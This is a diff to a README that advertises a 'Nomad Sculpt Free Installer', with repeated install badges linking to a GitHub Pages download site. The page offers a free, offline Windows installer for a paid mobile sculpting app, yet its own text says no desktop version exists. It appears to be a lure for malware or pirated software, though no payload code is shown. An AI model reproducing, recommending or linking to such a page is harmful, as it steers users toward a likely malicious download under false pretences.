@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Sculpting-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Nomad Sculpt Free Installer** — Nomad Sculpt is a mobile 3D sculpting app for iOS and Android that delivers professional sculpting capabilities on a tablet. Works without internet access, no account required. Full offline installation.
+**💻 Nomad Sculpt Free Installer** — Nomad Sculpt is a professional-grade 3D sculpting application for iPad, iPhone, and Android tablets. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad%20Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad+Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Nomad Sculpt
 
-Nomad Sculpt is a mobile 3D sculpting app for iOS and Android that delivers professional sculpting capabilities on a tablet. It supports dynamic topology, PBR materials, post-processing effects, and scene layers — bringing ZBrush-level sculpting to iPad.
+Nomad Sculpt is a professional-grade 3D sculpting application for iPad, iPhone, and Android tablets. With tools comparable to desktop sculpting software like ZBrush, Nomad Sculpt enables artists to create detailed 3D models, characters, and organic forms entirely on mobile devices. Features include dynamic topology, matcap shading, layer system, and export to OBJ and GLB formats.
 
 ---
 
 ## ❌ Problem: Nomad Sculpt is hard to access
 
-- **Mobile Primary** — Desktop version absent; iPad is the primary platform
-- **Hardware Dependent** — Performance varies dramatically by iPad model and RAM
-- **Subscription/One-Time** — Pricing model has varied; confirm current purchase model
-- **No Desktop Equivalent** — iPad-only limits professional production pipeline integration
+- **Mobile Only** — No desktop version; requires iOS or Android device
+- **Hardware Requirements** — Best performance on recent iPad Pro or high-end Android tablets
+- **File Size Complexity** — Very detailed models can exhaust device RAM
+- **Export Limitations** — Workflow to desktop applications requires manual export/import
 
 ---
 
@@ -81,7 +81,7 @@ Nomad Sculpt is a mobile 3D sculpting app for iOS and Android that delivers prof
 
 <div align="center">
 
-[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad%20Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad+Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Nomad Sculpt is a mobile 3D sculpting app for iOS and Android that delivers prof
 
 ---
 
-**Nomad Sculpt Free Installer** — Nomad Sculpt is a mobile 3D sculpting app for iOS and Android that delivers professional sculpting capabilities on a tablet. Install without internet connection today!
+**Nomad Sculpt Free Installer** — Nomad Sculpt is a professional-grade 3D sculpting application for iPad, iPhone, and Android tablets. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad%20Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nomad Sculpt](https://img.shields.io/badge/⬇_Install_Nomad+Sculpt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
